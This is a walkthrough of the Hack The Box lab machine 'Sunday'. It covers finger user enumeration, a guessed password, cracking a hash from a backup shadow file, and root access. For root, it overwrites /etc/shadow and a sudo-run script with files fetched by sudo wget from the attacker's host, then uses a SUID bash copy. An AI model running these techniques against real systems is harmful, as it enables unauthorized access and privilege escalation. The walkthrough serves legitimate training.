---
title:     "Hack The Box - Sunday"
tags: [linux,medium,finger,wget,sudo,SUID]
categories: HackTheBox OSCP-Like
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled.png)

Getting Initial is by gathering usernames from Finger service and gusesing the password gives use user shell and We need to find backup shadow file to get user sammy's password and privilege escalation is by SUID.

Link: [https://www.hackthebox.eu/home/machines/profile/136](https://www.hackthebox.eu/home/machines/profile/136)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```
PORT      STATE  SERVICE VERSION
79/tcp    open   finger
111/tcp   open   rpcbind 2-4 (RPC #100000)
22022/tcp open   ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
```

## Finger Enumeration

### What is Finger?

**A finger service is running on this host. The finger protocol is used to find out information about users on a remote system. Finger servers can usually provide either a list of logged-in users or detailed information on a single user.**

I just downloaded finger-user-enum tool from [Github](https://github.com/pentestmonkey/finger-user-enum). 

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%201.png)

Here we can see a lot of usernames and only a few have pts and others are TTY

PTS connections are SSH connections

TTY are direct connections to the computer like reverse shell something.

## Getting User Shell

If I tried to login normally, it throws me some error and after adding this argument it worked perfectly. So I tried some default creds and I used the box name as password and Im logged in. `sunny : sunday`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%202.png)

## Getting Sammy User Shell

The first thing I did is `sudo -l` and it shows me a binary located in root directory but I can't examine much of it.

```bash
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```

While checking through all the folders there is `shadow.backup` file in `/backup` directory and I got sammy user hash.

```bash
sunny@sunday:/$ ls
backup  boot   dev      etc     home    lib         media  net  platform  root   sbin    tmp  var
bin     cdrom  devices  export  kernel  lost+found  mnt    opt  proc      rpool  system  usr
sunny@sunday:/$ cd backup/
sunny@sunday:/backup$ ls
agent22.backup  shadow.backup
sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Cracked that using john and the password is `cooldude!`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%203.png)

Tried to ssh with `sammy : cooldude!` and Im logged in.

```bash
root@kali:~/CTF/HTB/Boxes/Sunday# ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76 -p 22022
Password: 
Last login: Tue Apr 24 12:57:03 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$ whoami
sammy
sammy@sunday:~$
```

## Privilege Escalation

Uploaded my enumeration script and it reveals me that `sudo -l` and it seems I can run `wget` as root without any password.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%204.png)

So I just created a hash using openssl 

```bash
root@kali:~/CTF/HTB/Boxes/Sunday# openssl passwd -1
Password: 
Verifying - Password: 
$1$9O207kaB$1arg8TyVn3Wuva8gQs.br1
```

And I copied my shadow file and changed the hash with the one I created.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sunday/Untitled%205.png)

Now I tried to overwrite the older one with mine and we need to mention `-O` in wget for the filename, otherwise it will be saved as `shadow1` since there is already a file that exists on that name.

```bash
sammy@sunday:/etc$ sudo /usr/bin/wget http://10.10.14.20:8000/shadow -O shadow
--14:33:07--  http://10.10.14.20:8000/shadow
           => `shadow'
Connecting to 10.10.14.20:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1,009 [application/octet-stream]

100%[=============================================================>] 1,009         --.--K/s             

14:33:08 (169.98 MB/s) - `shadow' saved [1009/1009]

sammy@sunday:/etc$ su root
Password: 
su: Password for user 'root' has expired
New Password: 
Re-enter new Password: 
su: password successfully changed for root
sammy@sunday:/etc# su root
sammy@sunday:/etc# whoami
root
```

Now I can do su to root with the new password. And here it says root password is expired and it asked for a new password so I just entered a new password and Im logged in.

### Another Method

We know there is a binary called `troll` which is located in `/root` directory and user sunny have permission to run that as root without any password, So I just made a small bash script that will copy the bash from `/usr/bash` and paste it in /tmp directory and make it SUID.

```bash
sammy@sunday:/root# sudo /usr/bin/wget http://10.10.14.20:8000/troll -O /root/troll 
--15:20:12--  http://10.10.14.20:8000/troll
           => `/root/troll'
Connecting to 10.10.14.20:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 61 [application/octet-stream]

100%[=======================================================================>] 61            --.--K/s             

15:20:13 (14.32 MB/s) - `/root/troll' saved [61/61]
```

Using wget I just replaced the older one, And we need to be quick here because there is some sort of cron running that replaces the file as fast as possible.

When I executed the binary it created the bash with SUID and I need to mention -p while running it because -p mentions run it as an effective user ID which is root.

```bash
sunny@sunday:/tmp$ sudo /root/troll
sunny@sunday:/tmp$ ls
bash  ogl_select254
sunny@sunday:/tmp$ ./bash -p
bash-3.2# whoami
root
bash-3.2#
```

We own the box